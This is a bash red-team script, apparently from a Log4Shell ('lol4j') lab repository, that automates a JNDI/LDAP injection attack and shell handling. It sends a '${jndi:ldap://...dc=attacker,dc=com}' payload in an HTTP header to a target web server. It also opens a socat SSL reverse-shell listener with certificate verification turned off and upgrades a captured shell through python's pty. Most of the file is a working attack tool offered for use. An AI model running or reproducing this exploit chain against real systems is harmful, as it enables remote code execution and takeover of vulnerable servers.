#!/bin/bash
#----------
RED="\e[95m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[36m"
ENDCOLOR="\e[0m"
#---------- 107 52
: '
(n) BACKTRACK
provide interactive tty and command exploration using which about the system utility despite the symbolic link
payload are also will be injected via netcat filesharing. heres are pinned favorable commands by cheatsheet:
- netcat 	- ncat   	- mvn     	- netstat    	- tput		- $TERM
- python   	- java    	- find    	- ifconfig      - tcpdump
- nano     	- javac   	- wget    	- iwconfig		- tar
'``
#----------
check_dependencies() { ## check coreutils dan python
	check_stty=$(dpkg-query -W -f='${Status}' coreutils 2>/dev/null | grep -c "ok installed")
	check_python=$(readlink -f $(whereis python) | grep bin | grep -wv config | sort -r | head -1)
	check_ncat=$(dpkg-query -W -f='${Status}' netcat-openbsd 2>/dev/null | grep -c "ok installed")	
	checker=0
	if [[ $check_stty -eq 0 ]]; then echo "coreutils is not installed ..."; else checker=$((checker+1)); fi
	if [[ $check_ncat -eq 0 ]]; then echo "netcat-openbsd is not installed ..."; else checker=$((checker+1)); fi		
	if [[ -z $check_python ]]; then echo "python is not installed ..."; else checker=$((checker+1)); fi
	if [[ $checker -eq 3 ]]; then echo "true $check_python"; else echo "false"; fi
}
#----------
opt_help() { ## display command usage
	echo -e "Usage: backtrack [OPTION]... [ARG]..."
	echo -e "Red Team utilities for setting up payload & generate interactive shell\n"
	echo -e "Available flag options, starred one are combination purposes ...\n"
	echo -e "  ${GREEN}-h${ENDCOLOR}\t launch command usage for avilable flag options & examples"	
	echo -e "  ${GREEN}-i${ENDCOLOR}\t initiate interactive tty's adjustment using the latest available python"
	echo -e "  ${GREEN}-s${ENDCOLOR}\t show information about command's binaries path & network interfaces "		
	echo -e "  ${GREEN}-w ${YELLOW}**${ENDCOLOR}\t assign Java Web Server port address's that runs the API"
	echo -e "  ${GREEN}-l ${YELLOW}**${ENDCOLOR}\t assign LDAP Server port address's that hosted the Java payload reference"
	echo -e "  ${GREEN}-p ${YELLOW}**${ENDCOLOR}\t assign the payload to the JNDI based on the CN of the entry"
	echo -e "  ${GREEN}-n ${YELLOW}**${ENDCOLOR}\t assign the local IP address of an available network interface for required services"
	echo -e "  ${GREEN}-o ${YELLOW}**${ENDCOLOR}\t specify the port address to open the remote shell listener"
	echo -e "  ${GREEN}-c ${YELLOW}**${ENDCOLOR}\t specify the SSL certificate path with .PEM format file"
	echo -e "\nExamples:\n"
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash backtrack.sh ${GREEN}-h${ENDCOLOR}"
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash backtrack.sh ${GREEN}-i${ENDCOLOR}"
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash backtrack.sh ${GREEN}-s${ENDCOLOR}"
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash backtrack.sh ${GREEN}-w${ENDCOLOR} 4080 ${GREEN}-l${ENDCOLOR} 2038 ${GREEN}-p${ENDCOLOR} 1807422020 ${GREEN}-n${ENDCOLOR} wifi0"
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash backtrack.sh ${GREEN}-w${ENDCOLOR} 192.168.1.11:8080 ${GREEN}-l${ENDCOLOR} 10.10.1.120:389 ${GREEN}-p${ENDCOLOR} 1807422024"	
	echo -e "  ${YELLOW}$ ${ENDCOLOR}bash backtrack.sh ${GREEN}-o${ENDCOLOR} 2100 ${GREEN}-c${ENDCOLOR} openssl-cert/bind.pem ${GREEN}-n${ENDCOLOR} wifi0"
	echo -e "\nFull documentation at github.com/hotpotcookie/lol4j-white-box/docs"
	echo -e "Open issues and report bugs to github.com/hotpotcookie/lol4j-white-box"
	exit 0
}
#----------
opt_initiate() { ## initiate terminal stty upgrade & terminal adjustment
	col=$(($(tput cols)-1))
	row=$(($(tput lines)-1))
	echo -e "${RED}[-]${ENDCOLOR} spawning python's tty in ${BLUE}$1${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} detecting terminal size, ${BLUE}$col${ENDCOLOR} x ${BLUE}$row${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} to use interactive shell, please do the following commands after suspension ..."
	#echo -e "${RED}[-]${ENDCOLOR} ${GREEN}$ ${ENDCOLOR}${YELLOW}stty raw -echo && fg && reset ${ENDCOLOR}"
	echo -e "${RED}[-]${ENDCOLOR} ${GREEN}$ ${ENDCOLOR}${YELLOW}stty rows $row columns $col ${ENDCOLOR}"
	echo -e "${RED}[-]${ENDCOLOR} ${GREEN}$ ${ENDCOLOR}${YELLOW}export TERM=xterm-256color${ENDCOLOR}"	
	$1 -c 'import pty; pty.spawn("/bin/bash")'
	exit 0
}
#----------
opt_show() { ## show information about system (path variabel & system information) in array
	arr_command=("nano" "vim" "ncat" "netcat" "find" "wget" "netstat" "tput" "tcpdump" "tar" "ifconfig" "ufw" "base64")
	arr_variable=("java" "javac" "mvn" "python")
	python_var=$1
	echo -e "${RED}[-]${ENDCOLOR} displaying command's binaries path ...\n:::"
	for env in ${arr_variable[@]}; do
		if [[ $env == "python" ]]; then echo -e "${YELLOW}python${ENDCOLOR}\t : $python_var"; continue; fi
		echo -e "${YELLOW}$env${ENDCOLOR}\t : $(which $env)"
	done; echo "--"
	for cmd in ${arr_command[@]}; do
		if [[ $cmd == "ifconfig" ]]; then echo -e "${YELLOW}ifconfig${ENDCOLOR} : $(which ifconfig)"; continue; fi
		echo -e "${YELLOW}$cmd${ENDCOLOR}\t : $(which $cmd)"
	done; echo ""
	echo -e "${RED}[-]${ENDCOLOR} displaying network interfaces ...\n:::"	
	get_interface=$(netstat -i | tr -s '\t' ' ' | cut -d ' ' -f 1 | grep -wv Kernel | grep -wv Iface | tr -s '\n' ' ')
	IFS=$' '
	arr_interface=($get_interface)
	for int in ${arr_interface[@]}; do
		if [[ "$int" != *"veth"* ]]; then
			echo -e "${BLUE}$int${ENDCOLOR}\t : $(ifconfig $int | grep inet | grep -vw inet6 | tr -s '\t' ' ' | cut -d ' ' -f 3-5)"
		else
			echo -e "${BLUE}$int${ENDCOLOR} ( virtual )"
		fi		
	done
	exit 0
}
#----------
opt_payload() { ## file transfer for payload & setup automation (unpack tar.gz, decode base64, etc)
	if [[ ! -z "$4" ]]; then
		wifi_ip=$(ifconfig $4 | grep "inet " | grep -vw inet6 | tr -s '\t' ' ' | cut -d ' ' -f 3)		
		web_ip=$wifi_ip; web_port=$1
		ldap_ip=$wifi_ip; ldap_port=$2
	echo -e "${RED}[-]${ENDCOLOR} wifi0       : ${BLUE}$wifi_ip${ENDCOLOR} ..."
	else
		web_ip=$(echo $1 | cut -d ':' -f 1)
		web_port=$(echo $1 | cut -d ':' -f 2)
		ldap_ip=$(echo $2 | cut -d ':' -f 1)
		ldap_port=$(echo $2 | cut -d ':' -f 2)		
	fi
	echo -e "${RED}[-]${ENDCOLOR} web-server  : http://${BLUE}$web_ip${ENDCOLOR}:${BLUE}$web_port${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} ldap-server : ldap://${BLUE}$ldap_ip${ENDCOLOR}:${BLUE}$ldap_port${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} payload     : \${jndi:ldap://${BLUE}$ldap_ip${ENDCOLOR}:${BLUE}$ldap_port${ENDCOLOR}/cn=${BLUE}$3${ENDCOLOR},dc=attacker,dc=com} ..."
	echo -e "---"
	curl http://$web_ip:$web_port -H 'Payload: ${jndi:ldap://'"$ldap_ip:$ldap_port"'/cn='"$3"',dc=attacker,dc=com}' -s | jq '.'
	exit 0
}
#----------
opt_openlistener() {
	ip=$(ifconfig $3 | grep "inet " | grep -vw inet6 | tr -s '\t' ' ' | cut -d ' ' -f 3)			
	echo -e "${RED}[-]${ENDCOLOR} SSL-listen : ${BLUE}$ip${ENDCOLOR}:${BLUE}$1${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} SSL-cert   : ${BLUE}$2${ENDCOLOR} ..."
	echo -e "${RED}[-]${ENDCOLOR} SSL-verify : disabled (0) ..."
	echo -e "---"	
	socat `tty`,raw,echo=0 openssl-listen:$1,cert=$2,verify=0
	exit 0	
}
#==========
get_check=$(check_dependencies | cut -d ' ' -f 1)
get_python=$(check_dependencies | cut -d ' ' -f 2)
if [[ $get_check == "true" ]]; then
	while getopts ":c:o:w:l:p:n: :i :s :h" opt; do
		case $opt in
			w) w="${OPTARG}" ;;
			l) l="${OPTARG}" ;;
			p) p="${OPTARG}" ;;
			n) n="${OPTARG}" ;;
			c) c="${OPTARG}" ;;
			o) o="${OPTARG}" ;;
			i) opt_initiate $get_python ;;
			s) opt_show $get_python ;;
			h) opt_help ;;
			*) h="go"
		esac
	done
	#----------	
	if [[ -z "$w" || -z "$l" || -z "$p" ]]; then	
		if [[ ! -z "$o" && ! -z "$c" && ! -z "$n" ]]; then
			opt_openlistener "$o" "$c" "$n"
			exit
		fi		
		if [[ "$h" != "go" ]]; then
			opt_help
			exit 0
		fi
	fi
	#----------
	if [[ "$w" && "$l" && "$p" ]]; then opt_payload "$w" "$l" "$p" "$n"; exit 0; fi
	opt_help
	exit 0
else
	echo "[-] host have unmet dependencies ..."
	echo -e "[-] quitting ...\n"
	exit 1
fi